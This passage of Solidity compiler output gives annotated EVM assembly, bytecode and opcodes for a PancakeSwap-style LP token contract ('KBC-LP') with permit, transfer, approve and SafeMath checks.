0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":698:814  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n    tag_37:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":341:343  18 */\n      0x12\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":308:343  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":557:588  bytes32 public DOMAIN_SEPARATOR */\n    tag_39:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":501:550  mapping(address => uint256) public _frozenBalance */\n    tag_42:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":381:425  mapping(address => uint256) public balanceOf */\n    tag_45:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":820:861  mapping(address => uint256) public nonces */\n    tag_48:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_50:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3068:3072  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      tag_65\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3094:3104  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3106:3108  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3110:3115  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3093  _transfer */\n      tag_72\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_60:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3730:3745  block.timestamp */\n      timestamp\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3726  deadline */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3745  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3710:3766  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_76\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_76:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3878:3894  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4121  nonces */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup3\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3912:4204  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3793:4228  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_77:\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4352  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_78\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4376:4381  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4372  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_78:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4301:4433  require(... */\n      tag_79\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_79:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      tag_80\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4452:4457  owner */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4459:4466  spender */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4468:4473  value */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4451  _approve */\n      tag_66\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      jump\t// in\n    tag_80:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_63:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_66:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2544  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2560  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2568  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2583:2614  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_70:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n    tag_72:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2732  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      tag_85\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2743:2748  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2742  balanceOf[from].sub */\n      tag_70\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_85:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2714  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2749  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2788  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      tag_86\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2793:2798  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2792  balanceOf[to].add */\n      tag_87\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_86:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2768  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2799  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_87:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n\n    auxdata: 0xa265627a7a723158205f24f6a3fe58ec9891addf7a0a87a0a838a4ce532ec73425d05fae792e93d66f64736f6c63430005100032\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060405146908060526109b7823960408051918290036052018220828201825260078352664b4243204c507360c81b6020938401528151808301835260018152603160f81b908401528151808401919091527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe818301527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606082015260808101949094523060a0808601919091528151808603909101815260c090940190528251920191909120600455506108cc806100eb6000396000f3fe608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a723158205f24f6a3fe58ec9891addf7a0a87a0a838a4ce532ec73425d05fae792e93d66f64736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x9B7 DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP4 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP4 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP4 ADD DUP4 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP2 DUP4 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP7 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP5 ADD SWAP1 MSTORE DUP3 MLOAD SWAP3 ADD SWAP2 SWAP1 SWAP2 KECCAK256 PUSH1 0x4 SSTORE POP PUSH2 0x8CC DUP1 PUSH2 0xEB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 